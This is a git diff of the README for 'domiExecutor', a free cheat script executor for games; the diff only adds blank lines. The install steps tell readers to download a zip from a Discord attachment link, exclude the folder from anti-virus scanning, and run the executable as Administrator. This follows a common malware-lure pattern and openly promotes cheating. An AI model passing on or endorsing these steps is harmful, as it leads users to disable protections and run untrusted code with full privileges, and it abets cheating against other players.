@@ -14,26 +14,37 @@ Why should cheaters have to pay to get a decent cheat? domiExecutor is completel
 Downloading and Installing domiExecutor onto your computer is quite simple, simply follow the steps listed bellow.
   
   &nbsp;&nbsp;1.) Goto the [Download](https://cdn.discordapp.com/attachments/928275005580673095/929182658452398151/domiExec.zip) (Is always up-to-date) 
+  
   &nbsp;&nbsp;2.) Extract the ZIP Archive onto your Desktop  
+  
   &nbsp;&nbsp;3.) **Configure Your Anti-Virus** to ignore the `domiExecutor` folder. *    
+  
   &nbsp;&nbsp;4.) Run the `domiExec.exe` as Administrator  
 
 #### To use the Script Hub:
   
   &nbsp;&nbsp;1.) Click Attach to attach the API
-  &nbsp;&nbsp;2.) Click Script Hub and choose your favorite  
+  
+  &nbsp;&nbsp;2.) Click Script Hub and choose your favorite 
+  
   &nbsp;&nbsp;3.) And boom! The script is now running!  
 
 #### To use the script list:
   &nbsp;&nbsp;1.) Click Attach to attach theAPI  
+  
   &nbsp;&nbsp;2.) Click the `Execute` Button   
+  
   &nbsp;&nbsp;3.) And boom! The code is now running!
   
 #### To use custom scripts:
-  &nbsp;&nbsp;1.) Click Attach to attach the API  
+  &nbsp;&nbsp;1.) Click Attach to attach the API 
+  
   &nbsp;&nbsp;2.) Click the `Open` Button and select a Script file OR type your code in the code in the IDE  
+  
   &nbsp;&nbsp;3.) Click the `Execute` Button  
+  
   &nbsp;&nbsp;4.) Click the `Save` Button if you want to save the file under another name
+  
   &nbsp;&nbsp;5.) And boom! Your custom code is now running!  
   
 ![screenshot1](https://media.discordapp.net/attachments/928275005580673095/929185183335346217/unknown.png)
